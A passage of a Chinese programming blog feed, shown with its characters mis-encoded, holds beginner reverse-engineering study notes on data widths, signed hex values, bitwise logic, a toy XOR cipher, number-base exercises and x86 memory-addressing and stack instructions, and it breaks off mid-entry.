8ä½å®½åº¦ï¼š</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>8ä½å®½åº¦è¡¨ç¤ºï¼šå‡è®¾è®¡ç®—æœºåªèƒ½å­˜å‚¨8ä½2è¿›åˆ¶æ•°ã€‚</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><img src="/2019/10/01/æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—/images/15699387217727.jpg" srcset="/img/loading.gif" alt="-w315"></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>æ— ç¬¦å·æ•°ï¼š0 1 2 3 4 â€¦â€¦FF</p><p>æœ‰ç¬¦å·æ•°ï¼š<br>æ­£æ•°ï¼š0 1 2 3 4 5 6 7 â€¦7F<br>è´Ÿæ•°ï¼š </p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th><th>â€¦.</th><th>-128</th></tr></thead><tbody><tr><td>FF</td><td>FE</td><td>FD</td><td>FC</td><td>FB</td><td>FA</td><td>F9</td><td>F8</td><td>â€¦.</td><td>80</td></tr></tbody></table><h4 id="16ä½å®½åº¦"><a href="#16ä½å®½åº¦" class="headerlink" title="16ä½å®½åº¦"></a>16ä½å®½åº¦</h4><p>16ä½å®½åº¦è¡¨ç¤ºï¼šå‡è®¾è®¡ç®—æœºåªèƒ½å­˜å‚¨16ä½2è¿›åˆ¶æ•°<br><img src="/2019/10/01/æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—/images/15699389940266.jpg" srcset="/img/loading.gif" alt="-w317"><br>æ— ç¬¦å·æ•°ï¼š0 1 2 3 4 â€¦â€¦FFFF</p><p>æœ‰ç¬¦å·æ•°ï¼š<br>æ­£æ•°ï¼š0 1 2 3 4 5 6 7 â€¦7FFF<br>è´Ÿæ•°ï¼š </p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th><th>â€¦.</th><th>-128</th></tr></thead><tbody><tr><td>FFFF</td><td>FFFE</td><td>FFFD</td><td>FFFC</td><td>FFFB</td><td>FFFA</td><td>FFF9</td><td>FFF8</td><td>â€¦.</td><td>8000</td></tr></tbody></table><h4 id="32ä½å®½åº¦"><a href="#32ä½å®½åº¦" class="headerlink" title="32ä½å®½åº¦"></a>32ä½å®½åº¦</h4><p>32ä½å®½åº¦è¡¨ç¤ºï¼šå‡è®¾è®¡ç®—æœºåªèƒ½å­˜å‚¨32ä½2è¿›åˆ¶æ•°<br><img src="/2019/10/01/æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—/images/15699391219590.jpg" srcset="/img/loading.gif" alt="-w378"><br>æ— ç¬¦å·æ•°ï¼š0 1 2 3 4 â€¦â€¦FFFFFFFF</p><p>æœ‰ç¬¦å·æ•°ï¼š<br>æ­£æ•°ï¼š0 1 2 3 4 5 6 7 â€¦7FFFFFFF<br>è´Ÿæ•°ï¼š </p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th><th>â€¦.</th><th>-128</th></tr></thead><tbody><tr><td>FFFFFFFF</td><td>FFFFFFFE</td><td>FFFFFFFD</td><td>FFFFFFFC</td><td>FFFFFFFB</td><td>FFFFFFFA</td><td>FFFFFFF9</td><td>FFFFFFF8</td><td>â€¦.</td><td>80000000</td></tr><tr><td>### å‡ ä¸ªæœ¬è´¨é—®é¢˜</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1ï¼šè®¡ç®—æœºé™¤äº†0å’Œ1ä»€ä¹ˆä¹Ÿä¸è®¤è¯†ã€‚</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>2ï¼šå¦‚æœå­˜çš„æ•°æ®è¶…è¿‡æ•°æ®é•¿åº¦é™åˆ¶ï¼Œè¶…è¿‡çš„ä¼šç›´æ¥æŠ›å¼ƒã€‚</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>3ï¼šæœ‰ç¬¦å·æ•°å’Œæ— ç¬¦å·æ•°æ˜¯æˆ‘ä»¬è‡ªå·±ç”¨çš„æ—¶å€™å®šä¹‰çš„ï¼Œå®šä¹‰æ˜¯ä»€ä¹ˆå°±æ˜¯ä»€ä¹ˆã€‚</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>### å‡ ä¸ªé‡è¦çš„è®¡é‡å•ä½ï¼š</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>BYTE  å­—èŠ‚  8BIT</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>WORD  å­—   16BIT 2å­—èŠ‚</p><p>DWORD åŒå­— 32BIT 4å­—èŠ‚</p><h2 id="é€»è¾‘è¿ç®—"><a href="#é€»è¾‘è¿ç®—" class="headerlink" title="é€»è¾‘è¿ç®—"></a>é€»è¾‘è¿ç®—</h2><h3 id="äºŒè¿›åˆ¶çš„é€»è¾‘è¿ç®—ï¼š"><a href="#äºŒè¿›åˆ¶çš„é€»è¾‘è¿ç®—ï¼š" class="headerlink" title="äºŒè¿›åˆ¶çš„é€»è¾‘è¿ç®—ï¼š"></a>äºŒè¿›åˆ¶çš„é€»è¾‘è¿ç®—ï¼š</h3><h4 id="orï¼š"><a href="#orï¼š" class="headerlink" title="orï¼š"></a>orï¼š</h4><p>æˆ–(or |)  åªè¦æœ‰ä¸€ä¸ªä¸º1å°±æ˜¯1<br><img src="/2019/10/01/æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—/images/15699395390213.jpg" srcset="/img/loading.gif" alt="-w915"></p><h4 id="andï¼š"><a href="#andï¼š" class="headerlink" title="andï¼š"></a>andï¼š</h4><p>ä¸(and &amp;)ä¸¤ä¸ªéƒ½ä¸º1æ‰æ˜¯1<br><img src="/2019/10/01/æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—/images/15699396122732.jpg" srcset="/img/loading.gif" alt="-w871"></p><h4 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h4><p>å¼‚æˆ–ï¼ˆxor) ä¸ä¸€æ ·ä¸º1<br><img src="/2019/10/01/æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—/images/15699397540402.jpg" srcset="/img/loading.gif" alt="-w928"><br>psï¼šé”™ä½äº†ã€‚ã€‚ã€‚</p><h4 id="not"><a href="#not" class="headerlink" title="not"></a>not</h4><p>é(not !) 1æ˜¯0 0æ˜¯1<br><img src="/2019/10/01/æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—/images/15699398562544.jpg" srcset="/img/loading.gif" alt="-w255"></p><h3 id="é€»è¾‘è¿ç®—çš„å…·ä½“åº”ç”¨ï¼š"><a href="#é€»è¾‘è¿ç®—çš„å…·ä½“åº”ç”¨ï¼š" class="headerlink" title="é€»è¾‘è¿ç®—çš„å…·ä½“åº”ç”¨ï¼š"></a>é€»è¾‘è¿ç®—çš„å…·ä½“åº”ç”¨ï¼š</h3><h4 id="æƒ³è·å–æŸä¸ªå€¼å¾—ç¬¬Nä½çš„å€¼æ˜¯1è¿˜æ˜¯0"><a href="#æƒ³è·å–æŸä¸ªå€¼å¾—ç¬¬Nä½çš„å€¼æ˜¯1è¿˜æ˜¯0" class="headerlink" title="æƒ³è·å–æŸä¸ªå€¼å¾—ç¬¬Nä½çš„å€¼æ˜¯1è¿˜æ˜¯0"></a>æƒ³è·å–æŸä¸ªå€¼å¾—ç¬¬Nä½çš„å€¼æ˜¯1è¿˜æ˜¯0</h4><p>å¦‚ï¼š8F<br>        <img src="/2019/10/01/æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—/images/15700250078922.jpg" srcset="/img/loading.gif" alt="-w135"><br><strong>æ–¹æ³•</strong>ï¼šæƒ³çœ‹ä¸‹ç¬¬å››ä½æ˜¯0è¿˜æ˜¯1ï¼Œå°±å†™ä¸ªç¬¬å››ä¸ªä½ä¸º1å…¶ä»–éƒ½ä¸º0çš„æ•°ï¼Œç„¶åè¿›è¡Œä¸€ä¸ªä¸è¿ç®—ï¼Œå¦‚æœå‡ºæ¥ç»“æœæ˜¯1.é‚£å°±è¯æ˜ç¬¬å››ä½å°±æ˜¯1ã€‚</p><h4 id="æœ€ç®€å•çš„åŠ å¯†ç®—æ³•ï¼š"><a href="#æœ€ç®€å•çš„åŠ å¯†ç®—æ³•ï¼š" class="headerlink" title="æœ€ç®€å•çš„åŠ å¯†ç®—æ³•ï¼š"></a>æœ€ç®€å•çš„åŠ å¯†ç®—æ³•ï¼š</h4><p>å¦‚ï¼š<br>è¦åŠ å¯†çš„æ•°æ®ï¼š2015<br>å¯†é’¥ï¼š54<br>å› ä¸ºå¯†é’¥æ˜¯ä¸¤ä½çš„ï¼Œæ‰€ä»¥è¦å¯¹2015åˆ†ä¸º<code>20</code>å’Œ<code>15</code>ã€‚<br><img src="/2019/10/01/æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—/images/15701063449646.jpg" srcset="/img/loading.gif" alt="-w279"><br>è¿›è¡Œä¸€æ¬¡xorè¿ç®—ï¼Œå‡ºæ¥å°±æ˜¯åŠ å¯†åçš„å€¼ï¼š<code>74</code> <code>41</code><br>å½“ç”¨ä»–ä¿©å†è¿›è¡Œä¸€æ¬¡xorè¿ç®—ï¼š<br><img src="/2019/10/01/æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—/images/15701064241084.jpg" srcset="/img/loading.gif" alt="-w253"><br>å°±åˆå˜æˆäº†2015ã€‚è¿™å°±å®Œæˆäº†åŠ å¯†è§£å¯†ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>è¿›åˆ¶å­¦ä¹ </title>
    <link href="/2019/09/28/%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/09/28/%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="è¿›åˆ¶å­¦ä¹ "><a href="#è¿›åˆ¶å­¦ä¹ " class="headerlink" title="è¿›åˆ¶å­¦ä¹ "></a>è¿›åˆ¶å­¦ä¹ </h1><h2 id="è¿›åˆ¶çš„å®šä¹‰"><a href="#è¿›åˆ¶çš„å®šä¹‰" class="headerlink" title="è¿›åˆ¶çš„å®šä¹‰"></a>è¿›åˆ¶çš„å®šä¹‰</h2><p>åè¿›åˆ¶çš„å®šä¹‰:ç”±åä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯<code>0 1 2 3 4 5 6 7 8 9</code>é€¢åè¿›ä¸€ã€‚</p><p>ä¹è¿›åˆ¶çš„å®šä¹‰:ç”±ä¹ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯<code>0 1 2 3 4 5 6 7 8</code>é€¢ä¹è¿›ä¸€ã€‚</p><p>åå…­è¿›åˆ¶çš„å®šä¹‰:ç”±åå…­ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯<code>0 1 2 3 4 5 6 7 8 9 A B C D E F</code></p><h2 id="è¿›åˆ¶çš„æœ¬è´¨"><a href="#è¿›åˆ¶çš„æœ¬è´¨" class="headerlink" title="è¿›åˆ¶çš„æœ¬è´¨"></a>è¿›åˆ¶çš„æœ¬è´¨</h2><p>ä¾‹å¦‚åè¿›åˆ¶ï¼š<code>0 1 2 3 4 5 6 7 8 9</code> å…¶å°±æ˜¯ç”±10ä¸ª<strong>ç¬¦å·</strong>ç»„æˆã€‚å¦‚æœå®šä¹‰å…¶ä¸º<code>9 1 5 2 4 7 6 3 8 0</code>,æˆ–è€…æ¢æˆ<img src="/2019/09/28/è¿›åˆ¶å­¦ä¹ /images/15696440221558.jpg" srcset="/img/loading.gif" alt="-w315">,å¦‚æœç”¨ä¸Šé¢çš„ç¬¦å·è¿›è¡ŒåŠ å¯†ä¸è§£å¯†ï¼Œè®©ä¸æ‡‚è¿›åˆ¶æœ¬è´¨çš„äººè§£å¯†æœ‰å¾ˆå¤§çš„é˜»ç¢ã€‚</p><h2 id="äºŒè¿›åˆ¶ä¸åå…­è¿›åˆ¶çš„æ˜ å°„å…³ç³»"><a href="#äºŒè¿›åˆ¶ä¸åå…­è¿›åˆ¶çš„æ˜ å°„å…³ç³»" class="headerlink" title="äºŒè¿›åˆ¶ä¸åå…­è¿›åˆ¶çš„æ˜ å°„å…³ç³»"></a>äºŒè¿›åˆ¶ä¸åå…­è¿›åˆ¶çš„æ˜ å°„å…³ç³»</h2><p><img src="/2019/09/28/è¿›åˆ¶å­¦ä¹ /images/15698464290376.jpg" srcset="/img/loading.gif" alt="-w911"><br>è¿™ä¸ªéœ€è¦èƒŒä¼šã€‚</p><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><h3 id="æ­£å¸¸è®¤çŸ¥çš„è¿›åˆ¶ï¼š"><a href="#æ­£å¸¸è®¤çŸ¥çš„è¿›åˆ¶ï¼š" class="headerlink" title="æ­£å¸¸è®¤çŸ¥çš„è¿›åˆ¶ï¼š"></a>æ­£å¸¸è®¤çŸ¥çš„è¿›åˆ¶ï¼š</h3><h4 id="äºŒè¿›åˆ¶"><a href="#äºŒè¿›åˆ¶" class="headerlink" title="äºŒè¿›åˆ¶"></a>äºŒè¿›åˆ¶</h4><p>ä»0å†™åˆ°100</p><p><img src="/2019/09/28/è¿›åˆ¶å­¦ä¹ /images/15713236407261.jpg" srcset="/img/loading.gif" alt="-w900"></p><h4 id="ä¸ƒè¿›åˆ¶"><a href="#ä¸ƒè¿›åˆ¶" class="headerlink" title="ä¸ƒè¿›åˆ¶"></a>ä¸ƒè¿›åˆ¶</h4><p>ç¼–åˆ¶7è¿›åˆ¶åŠ æ³•è¡¨ï¼Œä¹˜æ³•è¡¨ï¼Œå¹¶è®¡ç®—ä¸‹é¢çš„ç»“æœï¼š<strong>23456+54356=ï¼Ÿ5621-654=ï¼Ÿ234*65=ï¼Ÿ</strong><br><img src="/2019/09/28/è¿›åˆ¶å­¦ä¹ /images/15713237049873.jpg" srcset="/img/loading.gif" alt="-w608"><br>7è¿›åˆ¶åŠ æ³•è¡¨ï¼š<br><img src="/2019/09/28/è¿›åˆ¶å­¦ä¹ /images/15713237825325.jpg" srcset="/img/loading.gif" alt="-w541"><br>7è¿›åˆ¶ä¹˜æ³•è¡¨ï¼š<br><img src="/2019/09/28/è¿›åˆ¶å­¦ä¹ /images/15713238136767.jpg" srcset="/img/loading.gif" alt="-w537"><br>ç²—ç•¥è®¡ç®—è¿‡ç¨‹ï¼š<br><img src="/2019/09/28/è¿›åˆ¶å­¦ä¹ /images/15713245566592.jpg" srcset="/img/loading.gif" alt="-w275"><br>æœ¬è´¨å°±æ˜¯ç›´æ¥æŸ¥è¡¨äº†ã€‚</p><h4 id="åå…­è¿›åˆ¶ï¼š"><a href="#åå…­è¿›åˆ¶ï¼š" class="headerlink" title="åå…­è¿›åˆ¶ï¼š"></a>åå…­è¿›åˆ¶ï¼š</h4><p>ç¼–åˆ¶16è¿›åˆ¶åŠ æ³•è¡¨ï¼Œä¹˜æ³•è¡¨ï¼Œå¹¶è®¡ç®—ä¸‹é¢çš„ç»“æœï¼š2D4E6+CF3A6=ï¼Ÿ5FD1-E5A=ï¼Ÿ2CA*A5=ï¼Ÿ<br><img src="/2019/09/28/è¿›åˆ¶å­¦ä¹ /images/15713241502952.jpg" srcset="/img/loading.gif" alt="-w1387"><br>16è¿›åˆ¶åŠ æ³•ï¼š<br><img src="/2019/09/28/è¿›åˆ¶å­¦ä¹ /images/15713241702367.jpg" srcset="/img/loading.gif" alt="-w1337"><br>16è¿›åˆ¶ä¹˜æ³•è¡¨ï¼š<br><img src="/2019/09/28/è¿›åˆ¶å­¦ä¹ /images/15713241834458.jpg" srcset="/img/loading.gif" alt="-w1330"><br>ç²—ç•¥è®¡ç®—è¿‡ç¨‹ï¼š<br><img src="/2019/09/28/è¿›åˆ¶å­¦ä¹ /images/15713245906184.jpg" srcset="/img/loading.gif" alt="-w238"></p><p>éƒ½æ˜¯æŸ¥è¡¨ã€‚</p><h3 id="é¢å‘æœ¬è´¨çš„éè®¤çŸ¥è¿›åˆ¶ï¼š"><a href="#é¢å‘æœ¬è´¨çš„éè®¤çŸ¥è¿›åˆ¶ï¼š" class="headerlink" title="é¢å‘æœ¬è´¨çš„éè®¤çŸ¥è¿›åˆ¶ï¼š"></a>é¢å‘æœ¬è´¨çš„éè®¤çŸ¥è¿›åˆ¶ï¼š</h3><h4 id="ä¸€ï¼š"><a href="#ä¸€ï¼š" class="headerlink" title="ä¸€ï¼š"></a>ä¸€ï¼š</h4><p><strong>9è¿›åˆ¶å®šä¹‰ï¼šç”±9ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯ï¼š2ã€9ã€1ã€7ã€6ã€5ã€4ã€8ã€3ï¼Œé€¢9è¿›1</strong></p><p><strong>è®¡ç®—ï¼š123 + 234 = ?</strong></p><p>å…ˆç”»ä¸ªè¿›åˆ¶è¡¨ï¼š<br><img src="/2019/09/28/è¿›åˆ¶å­¦ä¹ /images/15699252652163.jpg" srcset="/img/loading.gif" alt="-w489"><br>ç„¶åè®¡ç®—ï¼š<br><img src="/2019/09/28/è¿›åˆ¶å­¦ä¹ /images/15699253052200.jpg" srcset="/img/loading.gif" alt="-w154"></p><p><strong>è§£é¢˜è¿‡ç¨‹:</strong><br>1)æœ€åä¸€ä½3+4ä¸­çš„4æ˜¯ç¬¬6ä¸ªæ•°ï¼Œæ‰€ä»¥3+4 å¯ä»¥çœ‹æˆä»3å‘åæ•°6ä¸ªä¸º95ï¼Œå–æœ€åä¸€ä¸ª5ä¸”æœ‰ä¸€ä¸ªè¿›ä½<br>2)æœ€åç¬¬äºŒä½2+3ä¸­çš„2æ˜¯ç¬¬0ä¸ªæ•°ï¼Œæ‰€ä»¥2+3ç›¸å½“3ï¼Œæœ‰ä¸€ä¸ªè¿›ä½ï¼Œéœ€è¦å†å‘åæŸ¥ä¸€ä¸ªæ˜¯92ï¼Œå–æœ€åä¸€ä½2ä¸”è¿›1ä½<br>3)ç¬¬ä¸€ä½1+2ä¸­çš„2æ˜¯ç¬¬0ä¸ªæ•°ï¼Œæ‰€ä»¥1+2ç›¸å½“äº1ï¼Œæœ‰ä¸€ä¸ªè¿›ä½ï¼Œè¦å†å‘åæŸ¥ä¸€ä¸ªï¼Œå†æŸ¥ä¸€ä½æ˜¯7ï¼Œæ‰€ä»¥æœ€åæ˜¯725</p><h4 id="äºŒï¼š"><a href="#äºŒï¼š" class="headerlink" title="äºŒï¼š"></a>äºŒï¼š</h4><p><strong>10è¿›åˆ¶å®šä¹‰ï¼šç”±10ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯ï¼š!ã€@ã€$ã€%ã€^ã€&amp;ã€*ã€Aã€Bã€Cï¼Œé€¢10è¿›1</strong></p><p>è®¡ç®—ï¼š@$$B + %AC&amp; = ? </p><p>å…ˆç”»ä¸ªè¿›åˆ¶è¡¨ï¼š<br><img src="/2019/09/28/è¿›åˆ¶å­¦ä¹ /images/15699343877953.jpg" srcset="/img/loading.gif" alt="-w583"><br>ç„¶åè®¡ç®—ï¼š<br><img src="/2019/09/28/è¿›åˆ¶å­¦ä¹ /images/15699344047423.jpg" srcset="/img/loading.gif" alt="-w185"></p><p><strong>è§£é¢˜è¿‡ç¨‹ï¼š</strong><br>1)æœ€åä¸€ä½<code>B+&amp;</code>ä¸­çš„<code>&amp;</code>æ˜¯ç¬¬5ä¸ªæ•°ï¼Œæ‰€ä»¥<code>B+&amp;</code>å¯ä»¥çœ‹æˆä»Bå‘åæ•°5ä¸ªä¸º<code>@%</code>ï¼Œå–æœ€åä¸€ä¸ª<code>%</code>ä¸”æœ‰ä¸€ä¸ªè¿›ä½<br>2)æœ€åç¬¬äºŒä½<code>$+C</code>ä¸­çš„Cæ˜¯ç¬¬9ä¸ªæ•°ï¼Œæ‰€ä»¥<code>$+C</code>ç›¸å½“ä»<code>$</code>å¼€å§‹æŸ¥9ä¸ªæ•°ï¼Œå‰é¢æœ‰ä¸€ä¸ªè¿›ä½ï¼Œéœ€è¦å†å‘åæŸ¥ä¸€ä¸ªæ˜¯<code>@$</code>ï¼Œå–æœ€åä¸€ä½<code>$</code>ä¸”è¿›1ä½<br>3)æœ€åç¬¬ä¸‰ä½<code>$+A</code>ä¸­çš„Aæ˜¯ç¬¬7ä¸ªæ•°ï¼Œæ‰€ä»¥<code>$+A</code>ç›¸å½“äºä»<code>$</code>å¼€å§‹å¾€åæŸ¥7ä¸ªï¼Œæœ‰ä¸€ä¸ªè¿›ä½ï¼Œè¦å†å‘åæŸ¥ä¸€ä¸ªï¼Œå†æŸ¥ä¸€ä½æ˜¯<code>@!</code>ï¼Œæ‰€ä»¥æœ€åæ˜¯<code>!</code>ä¸”è¿›ä¸€ä½<br>4)ç¬¬ä¸€ä½çš„<code>@+%</code>ä¸­çš„@æ˜¯ç¬¬ä¸€ä¸ªæ•°ï¼Œæ‰€ä»¥<code>@+%</code>ç›¸å½“äºä»<code>%</code>åœ¨å¾€åæŸ¥ä¸€ä½ï¼Œå› ä¸ºæœ‰ä¸ªè¿›ä½æ‰€ä»¥å†å¾€åæŸ¥ä¸€ä½å°±æ˜¯<code>&amp;</code>ã€‚æ‰€ä»¥ç­”æ¡ˆå°±æ˜¯<code>&amp;!$%</code>ã€‚</p><h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>ç»è¿‡è¿™æ¬¡å¯¹è¿›åˆ¶çš„å­¦ä¹ å’Œç»ƒä¹ ï¼Œå¯¹è¿›åˆ¶ç†è§£æ›´åŠ çš„æ·±åˆ»ï¼Œ<strong>å®ƒä»¬åªæ˜¯ä¸€å †ç¬¦å·</strong>ï¼Œåœ¨è¾¾åˆ°æŸä¸ªç¨‹åº¦åä¼šè¿›ä½ç½¢äº†ã€‚åœ¨å¤ä¹ åˆ°cåï¼Œæœ‰æ—¶é—´å¯ä»¥å­¦ä¹ ä¸€ä¸‹å†™ä¸ªè¿›åˆ¶åŠ å¯†çš„ç¨‹åºã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>é€†å‘å­¦ä¹ -æ»´æ°´å…¬å¼€è¯¾</title>
    <link href="/2019/09/27/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-%E6%BB%B4%E6%B0%B4%E5%85%AC%E5%BC%80%E8%AF%BE/"/>
    <url>/2019/09/27/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-%E6%BB%B4%E6%B0%B4%E5%85%AC%E5%BC%80%E8%AF%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="é€†å‘å­¦ä¹ -æ»´æ°´å…¬å¼€è¯¾çŸ¥è¯†æ€»ç»“"><a href="#é€†å‘å­¦ä¹ -æ»´æ°´å…¬å¼€è¯¾çŸ¥è¯†æ€»ç»“" class="headerlink" title="é€†å‘å­¦ä¹ -æ»´æ°´å…¬å¼€è¯¾çŸ¥è¯†æ€»ç»“"></a>é€†å‘å­¦ä¹ -æ»´æ°´å…¬å¼€è¯¾çŸ¥è¯†æ€»ç»“</h1><h3 id="ä¸€ã€å†…å­˜çš„è¯»å†™"><a href="#ä¸€ã€å†…å­˜çš„è¯»å†™" class="headerlink" title="ä¸€ã€å†…å­˜çš„è¯»å†™"></a>ä¸€ã€å†…å­˜çš„è¯»å†™</h3><h4 id="å¯»å€å…¬å¼ä¸€-ç«‹å³æ•°"><a href="#å¯»å€å…¬å¼ä¸€-ç«‹å³æ•°" class="headerlink" title="å¯»å€å…¬å¼ä¸€: [ç«‹å³æ•°]"></a>å¯»å€å…¬å¼ä¸€: [ç«‹å³æ•°]</h4><p>è¯»å–å†…å­˜çš„å€¼:<br>    <code>MOV EAX,DWORD PTR DS:[0x13FFC4]    MOV EAX,DYVORD PTR DS:[0x13FFC8]</code><br>    å‘å†…å­˜ä¸­å†™å…¥æ•°æ®:<br>    <code>MOV DWORD PTR DS:[0x13FFC4],eax    MOV DWORD PTR DS:[0x13FFC8].ebx</code><br>    è·å–å†…å­˜ç¼–å·:<br>  <code>LEA EAX,DWORD PTR DS:[0X13FFC4]    LEA EAX,DWORD PTR DS:[ESP+8]</code></p><h4 id="å¯»å€å…¬å¼äºŒ-reg-regä»£è¡¨å¯„å­˜å™¨å¯ä»¥æ˜¯8ä¸ªé€šç”¨å¯„å­˜å™¨ä¸­çš„ä»»æ„ä¸€ä¸ª"><a href="#å¯»å€å…¬å¼äºŒ-reg-regä»£è¡¨å¯„å­˜å™¨å¯ä»¥æ˜¯8ä¸ªé€šç”¨å¯„å­˜å™¨ä¸­çš„ä»»æ„ä¸€ä¸ª" class="headerlink" title="å¯»å€å…¬å¼äºŒ: [reg] regä»£è¡¨å¯„å­˜å™¨å¯ä»¥æ˜¯8ä¸ªé€šç”¨å¯„å­˜å™¨ä¸­çš„ä»»æ„ä¸€ä¸ª"></a>å¯»å€å…¬å¼äºŒ: [reg] regä»£è¡¨å¯„å­˜å™¨å¯ä»¥æ˜¯8ä¸ªé€šç”¨å¯„å­˜å™¨ä¸­çš„ä»»æ„ä¸€ä¸ª</h4><p>è¯»å–å†…å­˜çš„å€¼:<br><code>MOV ECX,0x13FFD0MOV EAX,DWORD PTR DS:[ECX]</code></p><p>å‘å†…å­˜ä¸­å†™å…¥æ•°æ®:<br><code>MOV EDX,0x13FFD8MOV DWORD PTR DS:[EDX],0x87654321</code></p><p>è·å–å†…å­˜ç¼–å·:<br><code>LEA EAX,DWORD PTR DS:[EDX]MOV EAX,DWORD PTR DS:[EDX]</code></p><h4 id="å¯»å€å…¬å¼ä¸‰-reg-ç«‹å³æ•°"><a href="#å¯»å€å…¬å¼ä¸‰-reg-ç«‹å³æ•°" class="headerlink" title="å¯»å€å…¬å¼ä¸‰: [reg+ç«‹å³æ•°]"></a>å¯»å€å…¬å¼ä¸‰: [reg+ç«‹å³æ•°]</h4><p>è¯»å–å†…å­˜çš„å€¼:<br><code>MOV ECX,0x13FFD0MOV EAX,DWORD PTR DS:[ECX+4]</code></p><p>å‘å†…å­˜ä¸­å†™å…¥æ•°æ®:<br><code>MOV EDX,0x13FFD8MOV DWORD PTR DS:[EDX+0xC].0x87654321</code></p><p>è·å–å†…å­˜ç¼–å·:<br><code>LEA EAX,DWORD PTR DS:[EDX+4]MOV EAX,DWORD PTR DS:[EDX+4]</code></p><h4 id="å¯»å€å…¬å¼å››ï¼š-reg-reg-ï¼ˆ1-or-2-or-4-or-8ï¼‰"><a href="#å¯»å€å…¬å¼å››ï¼š-reg-reg-ï¼ˆ1-or-2-or-4-or-8ï¼‰" class="headerlink" title="å¯»å€å…¬å¼å››ï¼š[reg+reg*ï¼ˆ1 or 2 or 4 or 8ï¼‰]"></a>å¯»å€å…¬å¼å››ï¼š[reg+reg*ï¼ˆ1 or 2 or 4 or 8ï¼‰]</h4><p>è¯»å–å†…å­˜çš„å€¼:<br><code>MOV EAX,13FFC4MOV ECX,2MOV EDX,DWORD PTR DS:[EAX+ECX*4]</code></p><p>å‘å†…å­˜ä¸­å†™å…¥æ•°æ®:<br><code>MOV EAX,13FFC4MOV ECX,2MOV DWORD PTR DS:[EAX+ECX*4],0x87654321</code></p><p>è·å–å†…å­˜ç¼–å·:<br><code>LEA EAX,DWORD PTR DS:[EAX+ECX*4]</code></p><h4 id="å¯»å€å…¬å¼äº”ï¼š-reg-reg-ï¼ˆ1-or-2-or-4-or-8ï¼‰-ç«‹å³æ•°"><a href="#å¯»å€å…¬å¼äº”ï¼š-reg-reg-ï¼ˆ1-or-2-or-4-or-8ï¼‰-ç«‹å³æ•°" class="headerlink" title="å¯»å€å…¬å¼äº”ï¼š[reg+reg*ï¼ˆ1 or 2 or 4 or 8ï¼‰+ç«‹å³æ•°]"></a>å¯»å€å…¬å¼äº”ï¼š[reg+reg*ï¼ˆ1 or 2 or 4 or 8ï¼‰+ç«‹å³æ•°]</h4><p>è¯»å–å†…å­˜çš„å€¼:<br><code>MOV EAX,13FFC4MOV ECX,2MOV EDX,DWORD PTR DS:[EAX+ECX*4+4]</code></p><p>å‘å†…å­˜ä¸­å†™å…¥æ•°æ®:<br><code>MOV EAX,13FFC4MOV ECX,2MOV DWORD PTR DS:[EAX+ECX*4+4],0x87654321</code></p><p>è·å–å†…å­˜ç¼–å·:<br><code>LEA EAX,DWORD PTR DS:[EAX+ECX*4+2]</code></p><h3 id="äºŒã€å †æ ˆ"><a href="#äºŒã€å †æ ˆ" class="headerlink" title="äºŒã€å †æ ˆ"></a>äºŒã€å †æ ˆ</h3><h4 id="å˜å½¢çš„è‰ºæœ¯"><a href="#å˜å½¢çš„è‰ºæœ¯" class="headerlink" title="å˜å½¢çš„è‰ºæœ¯:"></a>å˜å½¢çš„è‰ºæœ¯:</h4><h5 id="push-eaxä»£ç ç›¸å½“äº"><a href="#push-eaxä»£ç ç›¸å½“äº" class="headerlink" title="push eaxä»£ç ç›¸å½“äº:"></a>push eaxä»£ç ç›¸å½“äº:</h5><p><code>lea esp,dword ptr ss:[esp-4]mov dword ptr ss:[esp],eaxæˆ–è€…mov dword ptr ss:[esp-4],eaxlea esp,dword ptr ss:[esp-4]è¿˜æœ‰sub esp,0x4mov dword ptr ss:[esp],eax</code></p><h5 id="push-espä»£ç 